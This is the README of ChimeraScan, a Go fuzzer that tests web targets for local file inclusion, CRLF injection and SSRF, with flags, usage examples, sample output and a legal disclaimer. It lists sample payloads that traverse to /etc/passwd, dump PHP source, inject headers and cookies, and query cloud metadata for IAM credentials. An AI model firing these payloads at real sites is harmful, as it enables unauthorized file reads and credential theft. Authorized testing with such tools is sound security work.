# ChimeraScan

<div align="center">
   <a href="https://github.com/coffinxp/loxs"><img src="https://github.com/user-attachments/assets/9fadee1e-a33c-46e3-9eca-c04aa47a443e" hight="225" width="450" align="center"/></a>
</div>

<br>
<br>
<br>

<div align="center">

> Triple-threat web vulnerability fuzzer for **LFI**, **CRLF Injection**, and **SSRF** detection. Written in Go, single binary, zero dependencies.

```
   ___ _    _                    ___                 
  / __| |_ (_)_ __  ___ _ _ __ _/ __| __ __ _ _ _  
 | (__| ' \| | '  \/ -_) '_| '  \__ \/ _/ _` | ' \ 
  \___|_||_|_|_|_|_\___|_| |_|_|_|___/\__\__,_|_||_|
```

[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://go.dev)
[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey)]()

---

## ⚡ Features

- 🎯 **3 Vulnerability Modules** — LFI · CRLF Injection · SSRF
- 🔁 **Fuzzing Mode** — auto-replace placeholder `FUZZ` with payloads from wordlist
- 📁 **Simple File-Based Config** — plain `.txt` files, easy to customize
- 🧵 **Concurrent Scanning** — configurable thread pool
- 🎨 **Streaming Output** — hits print instantly as they're found
- 📝 **PoC Auto-Save** — save all hitting URLs to `poc.txt`
- 📊 **JSON Export** — structured findings output
- 🛑 **Graceful Ctrl+C** — press once to stop & save, twice to force exit
- 🪶 **Zero Dependencies** — pure Go standard library

---

## 🐉 Why "ChimeraScan"?

Named after the **Chimera** — a mythical creature composed of three different beasts. Just as the Chimera combines multiple forms, ChimeraScan combines **three vulnerability classes** into a single unified scanner.

---

## 📁 Project Structure

```
ChimeraScan/
├── main.go
├── go.mod
├── README.md
├── LICENSE
├── .gitignore
├── lfi/
│   ├── fuzzing/
│   │   └── payload.txt      # Payload only (replaces FUZZ placeholder)
│   └── nofuzz/
│       └── payload.txt      # Full path/query strings
├── crlf/
│   └── payload.txt          # Full path strings (CRLF injection)
└── ssrf/
    ├── fuzzing/
    │   └── payload.txt      # URL only (replaces FUZZ placeholder)
    └── nofuzz/
        └── payload.txt      # Full path/query strings
```

---

## 🚀 Installation

### Prerequisites

- Go **1.21** or higher
- Linux / macOS / Windows

### Build from source

```bash
git clone https://github.com/YOUR_USERNAME/ChimeraScan.git
cd ChimeraScan
go build -o chimerascan .
```

### Quick install

```bash
go install github.com/YOUR_USERNAME/ChimeraScan@latest
```

---

## 📖 Usage

```
chimerascan [options]
```

### Flags

| Flag | Description | Default |
|------|-------------|---------|
| `-u <url>` | Single target base URL | — |
| `-l <file>` | File with list of base URLs (one per line) | — |
| `-tags <list>` | Modules to run: `lfi`, `crlf`, `ssrf` (comma-separated) | all |
| `-fuzz` | Enable fuzzing — replaces `FUZZ` placeholder with payloads | `false` |
| `-poc` | Auto-save hitting URLs to `poc.txt` | `false` |
| `-o <file>` | Save findings to JSON | — |
| `-X <method>` | HTTP method | `GET` |
| `-d <body>` | Request body (may contain `FUZZ`) | — |
| `-H <header>` | Custom header `"Name: value"` (repeatable) | — |
| `-T <n>` | Concurrent threads | `20` |
| `-timeout <n>` | Request timeout in seconds | `15` |
| `-v` | Verbose output | `false` |
| `-stop-on-hit` | Stop scanning a target after first hit | `true` |

---

## 🧪 Examples

### LFI Fuzzing

```bash
./chimerascan -u "https://example.com/?file=FUZZ" -tags lfi -fuzz
```

### LFI No-Fuzz

```bash
./chimerascan -u https://example.com -tags lfi
```

### CRLF Injection

```bash
./chimerascan -u https://example.com -tags crlf
```

### SSRF No-Fuzz

```bash
./chimerascan -u https://example.com -tags ssrf
```

### SSRF Fuzzing

```bash
./chimerascan -u "https://example.com/?url=FUZZ" -tags ssrf -fuzz
```

### All Modules + PoC + JSON

```bash
./chimerascan -u https://example.com -tags lfi,ssrf -fuzz -poc -o findings.json
```

### Multiple Targets

`urls.txt`:
```
https://target1.example.com
https://target2.example.com
https://target3.example.com
```

```bash
./chimerascan -l urls.txt -tags lfi,ssrf,crlf -fuzz -T 30 -poc -o findings.json
```

### POST Requests

```bash
./chimerascan -u "https://example.com/api/read" \
    -tags lfi \
    -fuzz \
    -X POST \
    -d "file=FUZZ" \
    -H "Content-Type: application/x-www-form-urlencoded"
```

### Custom Headers

```bash
./chimerascan -u "https://example.com/" \
    -tags ssrf \
    -fuzz \
    -H "X-Forwarded-For: FUZZ"
```

---

## 📂 Payload Files

Payloads are plain text — one entry per line. Lines starting with `#` are comments.

### `lfi/fuzzing/payload.txt`

Only the payload itself. Tool replaces `FUZZ` in URL with each line.

```
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
php://filter/convert.base64-encode/resource=index.php
```

### `lfi/nofuzz/payload.txt`

Full path/query strings. Tool prepends your base URL.

```
/?file=../../../../etc/passwd
/?file=php://filter/convert.base64-encode/resource=index.php
/?path=../../../../etc/passwd
```

### `crlf/payload.txt`

Full path strings (CRLF always no-fuzz).

```
/%0d%0aSet-Cookie:coffin=hi
/%0aSet-Cookie:coffin=hi
/%0d%0aLocation: www.evil.com
```

### `ssrf/fuzzing/payload.txt`

Only the URL. Tool replaces `FUZZ` with each line.

```
http://127.0.0.1/
http://169.254.169.254/latest/meta-data/
http://localhost/admin
```

### `ssrf/nofuzz/payload.txt`

Full path/query with the SSRF target embedded.

```
/?url=http://127.0.0.1/
/?url=http://169.254.169.254/latest/meta-data/
/?url=file:///etc/passwd
```

---

## 🎯 Detection Signatures

### LFI

Detects by scanning **response body** against:

- Linux `/etc/passwd` markers (`root:x:0:0:`, `daemon:`, `bin:`)
- Windows `win.ini` (`[fonts]`, `for 16-bit app support`)
- Windows `boot.ini` (`[boot loader]`)
- PHP wrapper base64 markers (`PD9waHA` = `<?php`)
- Linux kernel banner (`Linux version N.N.N`)
- SSH private keys, `/proc/self/environ`, access logs

### CRLF Injection

Detects by scanning **response headers** against:

- `Location: www.evil.com` (unexpected redirect)
- `Set-Cookie: coffin=hi` (injected cookie)
- `coffin-x: coffin-x` (custom injected header)

Only counts as HIT if the response status code is `2xx` or `3xx`.

### SSRF

Detects by scanning **response body** against:

- Cloud metadata responses (AWS, GCP, Azure, Alibaba, DigitalOcean)
- Internal service banners (nginx, Apache, IIS default pages)
- File protocol contents (`/etc/passwd`, `/proc/self/environ`)
- Redis, Memcached info leaks

---

## 🛑 Graceful Shutdown

Press **Ctrl+C** at any time:

1. **First press** → finish current requests, save `poc.txt` and JSON, then exit
2. **Second press** → force exit immediately

Partial results are always saved if `-poc` or `-o` flags are set.

---

## 📤 Output Examples

### Terminal (streaming)

```
======================================================================
  ChimeraScan  —  LFI · CRLF · SSRF Fuzzer
  Triple-threat web vulnerability fuzzer
======================================================================
[*] Tags        : lfi, ssrf
[*] Mode LFI    : FUZZ (placeholder=FUZZ)
[*] Mode SSRF   : FUZZ (placeholder=FUZZ)
[*] Mode CRLF   : OFF
[*] Bases       : 1
[*] LFI src     : lfi/fuzzing/payload.txt (100 item)
[*] SSRF src    : ssrf/fuzzing/payload.txt (100 item)
[*] Method      : GET
[*] Threads     : 20   Timeout: 15s
[*] stop-on-hit : true
[*] Ctrl+C      : once = save & stop, twice = force exit
----------------------------------------------------------------------

[+][LFI] HIT
    Method     : GET
    Payload    : ../../../../etc/passwd
    URL        : https://example.com/?file=../../../../etc/passwd
    Status     : 200
    Signatures : passwd-root, passwd-bin
    Proof      : root:x:0:0:root:/root:/bin/bash

[+][SSRF] HIT
    Method     : GET
    Payload    : http://169.254.169.254/latest/meta-data/iam/security-credentials/
    URL        : https://example.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    Status     : 200
    Signatures : aws-metadata, aws-accesskey
    Proof      : ami-id:ami-12345678 instance-id:i-abcdef...

[=] Done.  Bases: 1  |  Requests: 15  |  Hits: 2  |  Time: 620ms
======================================================================
[*] PoC saved  : poc.txt (2 URL)
[*] JSON saved : findings.json
```

### `poc.txt`

```
# ChimeraScan PoC - 2026-10-09 14:32:11
# Format: [TAG] URL

[LFI] https://example.com/?file=../../../../etc/passwd
[SSRF] https://example.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### `findings.json`

```json
[
  {
    "tag": "lfi",
    "url": "https://example.com/?file=../../../../etc/passwd",
    "payload": "../../../../etc/passwd",
    "status": 200,
    "signatures": ["passwd-root", "passwd-bin"],
    "proof": "root:x:0:0:root:/root:/bin/bash",
    "method": "GET",
    "found_at": "2026-10-09T14:32:11Z"
  }
]
```

---

## 🛠️ Customization

### Add New Payloads

Just append lines to any `.txt` file:

```bash
echo "../../../../etc/hosts" >> lfi/fuzzing/payload.txt
```

### Add New Signatures

Edit the `lfiSignatures`, `ssrfSignatures`, or `crlfHeaders` arrays in `main.go`:

```go
var lfiSignatures = []Signature{
    {"passwd-root", regexp.MustCompile(`root:[^:]*:0:0:`)},
    // Add yours here
    {"my-signature", regexp.MustCompile(`my-pattern`)},
}
```

Rebuild:

```bash
go build -o chimerascan .
```

---

## ⚙️ Performance Tips

| Scenario | Recommendation |
|----------|---------------|
| Fast target | `-T 50 -timeout 10` |
| Slow target | `-T 10 -timeout 30` |
| WAF/rate limit | `-T 5 -timeout 20` |
| Only find first vuln | `-stop-on-hit` (default) |
| Enumerate all vulns | `--stop-on-hit=false` |

---

## ⚠️ Legal Disclaimer

> **This tool is provided for authorized security testing and educational purposes only.**
>
> - Only use against systems you **own** or have **explicit written permission** to test
> - Unauthorized scanning may violate laws (CFAA, Computer Misuse Act, UU ITE, etc.)
> - The author assumes **no liability** for misuse or damages caused by this tool
> - Report vulnerabilities responsibly through proper disclosure channels

By using this tool, you agree to use it ethically and legally.

---

## 🤝 Contributing

Pull requests are welcome! For major changes, please open an issue first.

1. Fork the repo
2. Create your feature branch (`git checkout -b feature/new-module`)
3. Commit changes (`git commit -m 'Add XXE module'`)
4. Push to branch (`git push origin feature/new-module`)
5. Open a Pull Request

### Roadmap

- [ ] OAST/Interactsh integration for blind SSRF
- [ ] WAF detection & auto-backoff
- [ ] Rate limiting (`-rps N`)
- [ ] Proxy support (`-proxy http://127.0.0.1:8080`)
- [ ] XXE, Open Redirect, SSTI modules
- [ ] Request/response raw dump in JSON output

---

## 📜 License

MIT License — see [LICENSE](LICENSE) file for details.

---

## 🙏 Acknowledgements

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — LFI & SSRF payload reference
- [HackTricks](https://book.hacktricks.xyz/) — vulnerability research
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — learning materials
- [OWASP](https://owasp.org/) — security standards

---

**Made with ❤️ for the security community**
